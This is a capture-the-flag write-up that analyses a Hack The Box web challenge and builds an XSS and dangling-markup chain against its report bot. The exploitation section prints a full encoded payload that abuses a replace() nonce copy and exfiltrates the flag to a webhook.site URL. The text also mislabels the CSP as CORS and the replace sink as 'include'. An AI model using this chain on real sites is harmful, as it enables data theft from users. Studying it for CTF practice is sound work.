+++
title = 'Nomad Notes'
date = 2024-01-14T07:07:07+01:00
draft = false
+++

# Nomad Notes

{{< figure src="/assets/nomad-notes/banner.png" >}}

Nomad Notes is a medium-level web challenge from Hack The Box.

## Setup test environment

For the challenge, the source code is provided along with Docker configuration files, allowing us to easily set up the environment for the application.

First, I make a few minor modifications to the container startup process to allow attaching the VS Code debugger to the application running inside the container.

{{< figure src="/assets/nomad-notes/docker-debbuger-config.png" >}}

{{< figure src="/assets/nomad-notes/debbuger-port.png" >}}

Following this, a proxy and a browser were configured for testing, thereby completing the setup of a full environment for the challenge.

{{< figure src="/assets/nomad-notes/app-running.png" >}}

## Taint Analisys
The next objective is to map the application's attack surface, identifying which exposed routes we can interact with and what each one does. This can be done either by interacting with the application and observing the endpoints logged in a proxy, or by reading the source code provided as part of the challenge.

 A hybrid approach is advantageous, as the source code allows us to identify the routes the application exposes, which we can then use to dynamically understand how to interact with them.

 ```js
// routes exported in routes.js

const express = require('express');
const router = express.Router();
const controllers = require('../controllers/controllers');

router.get('/', controllers.index);
router.get('/postcard', controllers.postcard);
router.get('/destinations', controllers.destinations);
router.post('/report', controllers.report);

module.exports = router;
 ```

After a few interactions with the app, we have a map of the application's routes within the proxy.

 {{< figure src="/assets/nomad-notes/initial-proxy.png" >}}

Taking advantage of the availability of the source code, the objective of the current phase is to understand the implementation of each available endpoint. This will provide insight into the context of each feature, as well as potential sinks that interact with the inputs sent via the endpoints' parameters, and, consequently, potential attack vectors.

```js
//controller.js

const report = (req, res) => {
    const { path = `http://${HOST}:${PORT}/` } = req.body;
    const headers = req.headers;
    if (isLoopback(req.socket.remoteAddress) && isAllowedOrigin(headers.origin) && headers['x-carta-auth-key']) {
        botVisit(`http://${HOST}:${PORT}/destinations?name=${encodeURIComponent(headers['x-carta-auth-key'])}&flag=${encodeURIComponent(FLAG)}`);
    } else {
        botVisit(`http://${HOST}:${PORT}/${path}`);
    }

    res.redirect(`/postcard?recipient=${encodeURIComponent('Friend')}&sender=${encodeURIComponent('Carta Team')}&message=${encodeURIComponent('Success! Your card is on its way. Our staff will verify it matches our travel standards. Enjoy the journey!')}&secret=${encodeURIComponent('Your delivery ID is logged in our system.')}`);
};
```

The first method analyzed is the handler for the `/report` endpoint.

This method first checks the origin of the request; it verifies that the request comes from the server itself, that the HTTP origin is validusing the `isLoopback` and `isAllowedOrigin` methods, in addition to checking for the presence of the `x-carta-auth-key` header.

```js
//utils.js

function isLoopback(addr) {
  console.log(addr);
  console.log(addr === '127.0.0.1' || addr === '::1');
  return addr === '127.0.0.1' || addr === '::1';
}
```

```js
//controller.js

const isAllowedOrigin = (origin) => {
    try {
        return new URL(origin).origin === APP_ORIGIN;
    } catch {
        return false;
    }
};
```

If the conditions are met, the `botVisit` method opens a Chrome browser and navigates to the `/destinations` route, passing the `x-carta-auth-key` header as the value for a `name` parameter, while also including the flag value as an additional parameter in the query string.

If the conditions do not match, the `botVisit` method directs the browser to an arbitrary endpoint, which is passed via the `path` query string parameter of the `/report` endpoint.

```js
//bot.js
async function botVisit(url) {
  console.log(`[BOT] Visiting: ${url}`);

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: execPath,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
    ],
  });

  try {
    const page = await browser.newPage();
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 8000 });
    await sleep(4000);
    console.log('[BOT] Visit complete.');
  } catch (err) {
    console.error(`[BOT] Error visiting ${url}:`, err.message);
  } finally {
    await browser.close();
  }
}

```

This indicates that a client-side attack is required to get the bot to access the `/destinations` route, with the flag included in the query string, along with a way to read that query string and extract the flag's value.

However, it is important to note that the application employs strict CORS policies, including the requirement for a `nonce` to ensure that only valid scripts are executed, which makes XSS attacks significantly more difficult.

```js
//app.js

app.use((req, res, next) => {
    const nonce = generateNonce(24);

    res.setHeader("Content-Security-Policy", `default-src 'none'; connect-src 'self'; script-src 'nonce-${nonce}'; style-src 'self'; img-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; require-trusted-types-for 'script';`);
    res.locals.nonce = nonce;

    next();
});
```

Examining the handler for the `/postcard` route, it can be noted that the route parameters are passed through a function that sanitizes HTML characters, then inserted into an HTML template and subsequently rendered.

```js
//controller.js

const postcard = (req, res) => {
    const {
        recipient = 'Traveler',
        sender = 'Carta Staff',
        message = 'Exploring the world, one card at a time.',
        secret = 'P.S. I left the key under the mat.'
    } = req.query;

    const date = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });

    const data = {
        nonce: res.locals.nonce,
        date,
        recipient: escape(recipient),
        sender: escape(sender),
        message: escape(message),
        secret: escape(secret)
    };

    const template = fs.readFileSync(path.join(VIEWS_DIR, 'postcard.html'), 'utf-8');
    res.send(renderTemplate(template, data));
};
```

```js
//utils.js

function escape(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

function renderTemplate(template, data) {
  for (const key in data) {
    const value = data[key];
    const lines = template.split('\n').map(line => {
      if (line.includes(`{{ ${key} }}`)) {
        return line.replace(`{{ ${key} }}`, value);
      }
      return line;
    });
    template = lines.join('\n');
  }
  return template;
}

```

As a result, simple XSS payloads are encoded and are not interpreted by the browser.

{{< figure src="/assets/nomad-notes/failed-xss.png" >}}

Analyzing the handler for `/destinations`, it is evident that the `name` parameter is inserted into the HTML without any sanitization, making it an easy vector for XSS.

```js
//controller.js

const destinations = (req, res) => {
    const { name = 'Explorer' } = req.query;

    const data = { name };

    const template = fs.readFileSync(path.join(VIEWS_DIR, 'destinations.html'), 'utf-8');
    res.send(renderTemplate(template, data));
};
```

However, the CORS-related restriction imposed by the application prevents the execution of JavaScript not authorized by the `nonce`.


{{< figure src="/assets/nomad-notes/blocked-xss.png" >}}

Through this analysis, it was possible to identify a bot that accesses a path controlled by the attacker (within the application's domain) using Chrome, as well as XSS vectors that were blocked by both sanitization and CSP directives.

### replace sink

While analyzing other functions that interact with external parameters, it was identified that within `renderTemplate`, the `replace` function consumes parameters passed via the query string without any form of value validation or control, representing a potential sink for us to exploit.

By reading the documentation for the `include` function, one can identify the possibility of using control characters that alter the function's behavior, thereby creating an opening for a potential injection attack, given that these characters are not modified by the `escape` function.

{{< figure src="/assets/nomad-notes/replace-docs.png" >}}

By conducting small tests with each of these potential values, an interesting behavior was identified for the value `` $` ``: the entire line preceding the match is repeated before the replacement value. This creates an opportunity to copy the `nonce` value into our script, thereby generating a valid script tag that satisfies the application's CORS policy and allows for the execution of JavaScript.

```html
<!-- postcard.html -->

 <script nonce={{ nonce }}>let secret = "{{ secret }}";</script>
```

{{< figure src="/assets/nomad-notes/replace-test-abc.png" >}}

By injecting a control character, and given the behavior of copying the entire line up to the replacement value, it becomes possible to write an arbitrary value inside a `script` tag that contains a `nonce` valid under CORS. 

This allows for the injection of JavaScript code to be executed, bypassing both CORS restrictions and the characters otherwise escaped by the `escape` function, thereby enabling an XSS vector. We were able to execute an `alert` function to confirm the discovered primitive.

{{< figure src="/assets/nomad-notes/test-alert.png" >}}

With this vulnerability, it is possible to send the bot to a page containing our XSS payload and control the browser to perform a `fetch` request to `/report`. This satisfies the origin requirements, causing the browser to access the `/destinations` route with the flag included in the query string. However, a second issue must be addressed: how to retrieve the value of the flag without requiring a new XSS injection on the `/destinations` page.

For this page, there is no script with a valid `nonce` that we could copy via the `include` sink. Consequently, CORS will block any XSS attempt.

One weakness of this route is the absence of the `escape` method; while XSS is not a viable vector here, the injection of HTML code is still possible.

In this article, we can find techniques for extracting user information using only HTML tags—without the need for JavaScript—which fits perfectly with the remaining problem: https://hacktricks.alquymia.com.br/pentesting-web/dangling-markup-html-scriptless-injection/index.html

So, the final attack plan is:
1. Leverage the `include` sink to achieve a valid XSS, forcing the bot's browser to access the `/reports` route from a local origin; this, in turn, triggers a request to the `/destinations` route with the flag included in the query string.
2. Send an HTML tag designed for data exfiltration via the `x-carta-auth-key` header; this tag will be injected into the `/destinations` page through the `name` parameter, ultimately exfiltrating the data to a webhook under control.

## Exploitation

The final payload to execute this plan is this value for the `POST /report` route:

```http
path=postcard%3Frecipient%3DPortas%26sender%3DPentest%26message%3D%253Cimg%2520src%3Dx%253E%26secret%3D%24`%3Bfetch(`%2Freport`%2C%7Bmethod%3A`POST`%2Cheaders%3A%7B%5B`content-type`%5D%3A`application%2Fx-www-form-urlencoded`%2C%5B`x-carta-auth-key`%5D%3Aatob(`PjxtZXRhIG5hbWU9InJlZmVycmVyIiBjb250ZW50PSJ1bnNhZmUtdXJsIj48bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO3VybD1odHRwOi8vd2ViaG9vay5zaXRlLzk3NDQwODNiLWFiZGYtNDRjZC1iMWFiLTY4OTliMzhlMWQyYi8iPg%3D%3D`)%7D%2Cbody%3A`path%3D%2F`%7D)%3B%2F%2F
```

{{< figure src="/assets/nomad-notes/post-payload.png" >}}

{{< figure src="/assets/nomad-notes/fake-flag.png" >}}

Now, simply apply the exploit in the production environment and obtain the actual flag.

{{< figure src="/assets/nomad-notes/real-post.png" >}}

{{< figure src="/assets/nomad-notes/real-flag.png" >}}